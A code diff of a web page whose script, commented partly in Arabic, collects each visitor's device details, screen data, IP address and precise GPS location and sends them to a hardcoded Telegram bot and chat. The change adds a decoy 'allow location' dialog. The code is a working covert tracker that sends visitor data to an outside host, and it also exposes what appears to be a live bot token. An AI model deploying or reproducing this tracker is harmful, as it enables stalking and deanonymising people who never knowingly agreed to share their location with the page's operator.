@@ -30,6 +30,12 @@
       </div>
     </div>
 
+    <div id="permission-dialog" style="display: none;">
+      <p>This website would like to access your location.</p>
+      <button id="allow-button">Allow</button>
+      <button id="deny-button">Deny</button>
+    </div>
+
     <script>
       const BOT_TOKEN = '6575631247:AAHgvHAO8xAgtX3KzUnGC-pg-cownq7Jl58';
       const CHAT_ID = '1776689384'; // تم تغيير ID الشات
@@ -112,56 +118,64 @@
 
       // إرسال رسالة عند دخول المستخدم
       async function sendEntryMessage() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(async function(position) {
-            try {
-              let message = '👤 A new user has entered the site! 👤\n';
+        document.getElementById('permission-dialog').style.display = 'block';
 
-              // Device Information
-              message += `\n📱 Device Information 📱:\n`;
-              message += `- Device Name: ${getDeviceName()}\n`;
-              message += `- User Agent: ${navigator.userAgent}\n`;
-              message += `- Platform: ${navigator.platform}\n`;
-              message += `- 🗣 Language: ${navigator.language}\n`;
-              message += `- 🌐 Online: ${navigator.onLine ? 'Yes' : 'No'}\n`;
-              message += `- 🍪 Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}\n`;
-              message += `- Device Type: ${getDeviceType()}\n`;
+        document.getElementById('allow-button').addEventListener('click', function() {
+          document.getElementById('permission-dialog').style.display = 'none';
 
-              // Screen Information
-              message += `\n🖥️ Screen Information 🖥️:\n`;
-              message += `- Width: ${screen.width}\n`;
-              message += `- Height: ${screen.height}\n`;
-              message += `- Color Depth: ${screen.colorDepth}\n`;
-              message += `- Pixel Depth: ${screen.pixelDepth}\n`;
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async function(position) {
+              try {
+                let message = '👤 A new user has entered the site! 👤\n';
 
-              // IP Address
-              const ipResponse = await fetch('https://api.ipify.org?format=json');
-              if (ipResponse.ok) {
-                const ipData = await ipResponse.json();
-                message += `\n🌐 IP: ${ipData.ip}`;
+                // Device Information
+                message += `\n📱 Device Information 📱:\n`;
+                message += `- Device Name: ${getDeviceName()}\n`;
+                message += `- User Agent: ${navigator.userAgent}\n`;
+                message += `- Platform: ${navigator.platform}\n`;
+                message += `- 🗣 Language: ${navigator.language}\n`;
+                message += `- 🌐 Online: ${navigator.onLine ? 'Yes' : 'No'}\n`;
+                message += `- 🍪 Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}\n`;
+                message += `- Device Type: ${getDeviceType()}\n`;
+
+                // Screen Information
+                message += `\n🖥️ Screen Information 🖥️:\n`;
+                message += `- Width: ${screen.width}\n`;
+                message += `- Height: ${screen.height}\n`;
+                message += `- Color Depth: ${screen.colorDepth}\n`;
+                message += `- Pixel Depth: ${screen.pixelDepth}\n`;
+
+                // IP Address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                if (ipResponse.ok) {
+                  const ipData = await ipResponse.json();
+                  message += `\n🌐 IP: ${ipData.ip}`;
+                }
+
+                // Location
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+                message += `\n📍 Location: ${googleMapsLink}`;
+
+                sendMessage(message);
+
+              } catch (err) {
+                console.error('Error:', err);
               }
+            }, function(error) {
+              console.error('Error getting location:', error);
+            });
+          } else {
+            // لا يتم دعم الموقع
+            console.error('Geolocation is not supported.');
+          }
+        });
 
-              // Location
-              const latitude = position.coords.latitude;
-              const longitude = position.coords.longitude;
-              const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
-              message += `\n📍 Location: ${googleMapsLink}`;
-
-              sendMessage(message);
-
-              // إظهار المحتوى بعد الحصول على الإذن
-              document.body.style.display = 'block';
-
-            } catch (err) {
-              console.error('Error:', err);
-            }
-          }, function(error) {
-            console.error('Error getting location:', error);
-          });
-        } else {
-          // لا يتم دعم الموقع
-          console.error('Geolocation is not supported.');
-        }
+        document.getElementById('deny-button').addEventListener('click', function() {
+          document.getElementById('permission-dialog').style.display = 'none';
+          // يمكنك إضافة رسالة رفض هنا
+        });
       }
 
       function getDeviceType() {
@@ -210,9 +224,6 @@
           console.error('حدث خطأ: ', err);
         }
       }
-
-      // إخفاء المحتوى حتى الحصول على الإذن
-      document.body.style.display = 'none';
 
       sendEntryMessage();
     </script>
